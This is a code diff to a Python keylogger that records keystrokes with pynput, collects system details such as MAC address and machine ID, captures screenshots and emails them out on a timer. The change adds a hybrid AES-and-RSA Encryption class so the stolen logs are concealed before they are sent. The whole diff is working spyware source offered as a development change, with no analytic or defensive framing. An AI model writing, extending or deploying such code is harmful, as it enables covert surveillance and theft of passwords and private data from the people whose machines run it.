@@ -16,6 +16,9 @@ from email.mime.image import MIMEImage
 import pynput.keyboard as Keyboard
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
+from Crypto.Cipher import AES
+from Crypto import Random
+import hashlib
 import base64
 from threading import Timer
 import time
@@ -75,7 +78,7 @@ class Keylogger():
         self.append_to_system_info(f"Architecture : {arch}\n")
         self.append_to_system_info(f"MAC address : {mac_address}\n") 
         self.append_to_system_info(f"Unique machine ID : {machine_id}\n")
-        self.send_mail(self.encrypt(self.system_info))
+        self.send_mail(Encryption().encrypt(self.system_info))
     
     def screenshot(self):
         filename = ''.join(random.choice(string.ascii_letters) for x in range(10))
@@ -147,14 +150,8 @@ class Keylogger():
                 current_key = str(f" {key} ")
                 self.append_to_log(current_key)
     
-    def encrypt(self, message):
-        publicKey = RSA.importKey(RSA_PUBLIC_KEY)
-        cipher = PKCS1_OAEP.new(publicKey)
-        ciphertext = cipher.encrypt(message.encode())
-        return base64.b64encode(ciphertext)
-    
     def report(self):
-        self.send_mail(self.encrypt(self.log), self.screenshot())
+        self.send_mail(Encryption().encrypt(self.log), self.screenshot()) #ENC
         class RepeatTimer(Timer):
             def run(self):
                 while not self.finished.wait(self.interval):
@@ -170,7 +167,45 @@ class Keylogger():
             time.sleep(self.interval)
             self.report()
         except KeyboardInterrupt: 
-            self.send_mail(self.encrypt(self.log), self.screenshot())
+            self.send_mail(Encryption().encrypt(self.log), self.screenshot())
+
+
+class Encryption():
+    def __init__(self):
+        # AES
+        self.block_size = 16
+        self.key_length = 60
+        self.key = self.get_key()
+        # RSA
+        self.public_key = RSA_PUBLIC_KEY
+
+    def get_key(self):
+        string.printable = string.printable.split(" ")[0]
+        return ''.join(random.choice(string.printable) for _ in range(self.key_length))
+
+    def pad(self, object):
+        return (object + (self.block_size - len(object) % self.block_size) * chr(self.block_size - len(object) % self.block_size)).encode("utf-8")
+
+    def unpad(self, object):
+        return (object[:-ord(object[len(object) - 1:])])
+
+    def AESencrypt(self, plaintext):
+        private_key = hashlib.sha256(self.key.encode("utf-8")).digest()
+        iv = Random.new().read(self.block_size)
+        plaintext = self.pad(plaintext)
+        cipher = AES.new(private_key, AES.MODE_EAX, iv)
+        return base64.b64encode(iv + cipher.encrypt(plaintext)).decode("utf-8")
+
+    def RSAencrypt(self, plaintext):
+        publicKey = RSA.importKey(RSA_PUBLIC_KEY)
+        cipher = PKCS1_OAEP.new(publicKey)
+        ciphertext = cipher.encrypt(plaintext.encode())
+        return base64.b64encode(ciphertext).decode("utf-8")
+    
+    def encrypt(self, plaintext):
+        logs = self.AESencrypt(plaintext)
+        key = self.RSAencrypt(self.key)
+        return f"\nLogs:\n{logs}\n\n\nKey:\n{key}\n\n"
 
 keylogger = Keylogger()
 keylogger.run()
